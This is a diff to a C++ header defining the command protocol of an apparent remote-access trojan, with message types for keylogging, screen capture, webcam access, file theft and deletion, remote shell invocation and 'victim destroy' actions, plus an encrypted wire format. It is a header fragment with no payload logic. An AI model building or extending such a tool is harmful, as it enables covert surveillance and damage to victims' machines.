@@ -9,20 +9,17 @@ enum MessageEnum {
     MessageRawText,
     MessageScreenCap,
     MessageEnableKeylog,
-    MessageHeartbeartKeylog,
     MessageDisableKeylog,
     MessageInvokeWebcam,
-    MessageEnableMicro,     //unimplemented
-    MessageDisableMicro,    //unimplemented
-    MessageListFile,
-    MessageGetFile,
-    MessageDeleteFile,
-    MessageModifyFile,      //unimplemented
+    MessageListFile,        //unimplemented
+    MessageGetFile,         //unimplemented
+    MessageDeleteFile,      //unimplemented
     MessageShutdownMachine,
+    MessageRestartMachine,
     MessageInvokePowershell,//unimplemented
     MessageInvokeCmd,       //unimplemented
     MessageVictimDestroy1,  //unimplemented
-    MessageVictimDestroy2,  
+    MessageVictimDestroy2,  //unimplemented
     MessageVictimDestroy3,  //unimplemented
 };
 
@@ -32,6 +29,9 @@ class Message {
     uint16_t returnCode = 1;
     uint16_t reserved = 0;
 
+    Message() = default;
+    Message(const Message&);
+    Message& operator=(const Message&);
     ~Message();
 
     void setJsonData(const json& j);
@@ -81,7 +81,7 @@ int assembleMessage(const char *bindata, int size, Message& msg, std::string *er
 
 int prepareMessage(const Message& msg, char*& data, int& dataSize, std::string *errorString = nullptr);
 
-int proceedEncryptedMessage(const char *bindata, int size, std::vector<uint8_t>& fullData, int& lastDataRemainingSize, std::array<uint8_t, 12>& nonce, std::string *errorString = nullptr);
+// int proceedEncryptedMessage(const char *bindata, int size, std::vector<uint8_t>& fullData, int& lastDataRemainingSize, std::array<uint8_t, 12>& nonce, std::string *errorString = nullptr);
 
 /**
  * Message format decrypted:
@@ -99,9 +99,9 @@ int proceedEncryptedMessage(const char *bindata, int size, std::vector<uint8_t>&
  * Message format encrypted:
  * 4 byte magic number: ZZTE
  * 4 byte: encrypted data size (only positive int)
- * the rest: entire (Message format decrypted) encrypted data
  * 12 byte: the nonce
  * 4 byte: reserved (should be 0)
+ * the rest: encrypted data
  */
 
  /**
